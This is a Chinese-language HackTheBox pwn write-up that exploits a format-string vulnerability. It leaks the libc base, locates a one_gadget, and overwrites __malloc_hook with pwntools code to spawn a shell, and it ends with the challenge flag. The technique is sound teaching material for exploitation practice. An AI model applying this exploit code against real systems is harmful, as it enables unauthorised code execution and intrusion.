---
layout: writeup
lang: zh
title: "HackTheBox - Format (格式化字符串 + malloc_hook 覆写)"
description: "利用格式化字符串漏洞泄露 libc 基址，随后将 __malloc_hook 覆写为 one_gadget 获取 shell。"
platform: "HackTheBox"
category: "Pwn"
difficulty: "Hard"
date: 2026-03-15
permalink: /zh/ctf-writeups/htb-pwn-format/
---

## 题目信息

**平台：** HackTheBox
**类别：** Pwn
**难度：** Hard

## 保护机制

```bash
checksec format
# Arch: amd64
# RELRO: Full RELRO
# Stack: Canary found
# NX: enabled
# PIE: enabled
```

所有保护全开。Full RELRO 意味着 GOT 只读，无法覆写函数指针。转而攻击 libc 中的 `__malloc_hook`，该地址仍可写，且每次调用 `malloc()` 之前都会被触发。

## 漏洞分析

程序直接将用户输入传给 `printf()`：

```c
printf(buf);
```

格式化字符串漏洞，具备任意读写原语。

## 第一步：泄露 libc 基址

用 `%p` 遍历栈上指针，找到 libc 地址：

```python
from pwn import *

p = remote('<host>', <port>)
p.sendline(b'%15$p')
leak = int(p.recvline(), 16)
libc_base = leak - libc.symbols['__libc_start_main'] - 243
```

## 第二步：查找 one_gadget

```bash
one_gadget libc.so.6
# 0xe3afe execve("/bin/sh") constraints: rax == NULL
```

```python
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget  = libc_base + 0xe3afe
```

## 第三步：覆写 malloc_hook

用 pwntools 的 `fmtstr_payload` 将 one_gadget 地址写入 `__malloc_hook`：

```python
payload = fmtstr_payload(offset, {malloc_hook: one_gadget})
p.sendline(payload)
```

## 第四步：触发

程序下次调用 `malloc()` 时会先命中 `__malloc_hook`，该地址现已指向 one_gadget，shell 弹出。

## Flag

```
HTB{mall0c_h00k_f0r_th3_w1n!}
```

## 总结

- Full RELRO 封堵了 GOT，但 `__malloc_hook`、`__free_hook`、`__realloc_hook` 依然可写
- `one_gadget` 可以快速找到 libc 中的 shell gadget，省去构造完整 ROP 链
- pwntools 的 `fmtstr_payload` 自动处理字节拆分计算
